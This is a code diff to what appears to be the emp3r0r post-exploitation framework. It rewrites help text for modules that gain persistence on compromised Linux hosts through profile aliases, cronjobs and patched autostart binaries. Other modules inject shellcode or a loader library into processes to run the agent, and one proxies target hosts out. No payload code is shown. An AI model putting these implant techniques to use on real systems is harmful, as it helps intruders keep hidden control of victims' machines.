@@ -2,6 +2,7 @@ package emp3r0r_data
 
 import (
 	"context"
+	"fmt"
 	"net/http"
 	"os"
 	"strconv"
@@ -95,9 +96,13 @@ const (
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
 var PersistMethods = map[string]string{
 	"profiles": "Add some aliases to shell profiles",
-	"injector": "Inject loader.so to some processes, will lose persistence after reboot",
 	"cron":     "Add a cronjob",
-	"patcher":  "Patch some ELFs",
+	"patcher":  "Patch some binaries (autostarting ones) so they load loader.so on startup",
+}
+
+var InjectorMethods = map[string]string{
+	"shellcode":      "Inject shellcode (see wiki), if no shellcode is specified, it will inject guardian.asm (runs emp3r0r as child process)",
+	"shared_library": "Inject a shared library, if no library is specified, it will inject loader.so (ELF loader that runs emp3r0r agent)",
 }
 
 // Module help info, ls_modules shows this
@@ -122,7 +127,7 @@ var ModuleComments = map[string]string{
 // help module shows this
 var ModuleHelp = map[string]map[string]string{
 	ModPERSISTENCE: {
-		"method": "Method to get persistence, or all of them at once (not recommended). Available methods: profiles: " + PersistMethods["profiles"] + ", injector: " + PersistMethods["injector"] + ", cron: " + PersistMethods["cron"] + ", patcher: " + PersistMethods["patcher"],
+		"method": fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"]),
 	},
 	ModCMD_EXEC: {
 		"cmd_to_exec": "Press TAB for some hints",
@@ -150,7 +155,7 @@ var ModuleHelp = map[string]map[string]string{
 	},
 	ModINJECTOR: {
 		"pid":    "Target process PID, set to 0 to start a new process (sleep)",
-		"method": "Use `inject_shellcode` to inject any shellcode, use `*_loader` to inject loader.so",
+		"method": fmt.Sprintf("Injection method, available methods: shellcode: %s; shared_library: %s", InjectorMethods["shellcode"], InjectorMethods["shared_library"]),
 	},
 	ModBring2CC: {
 		"addr": "Target host to proxy, we will connect to it and proxy it out",
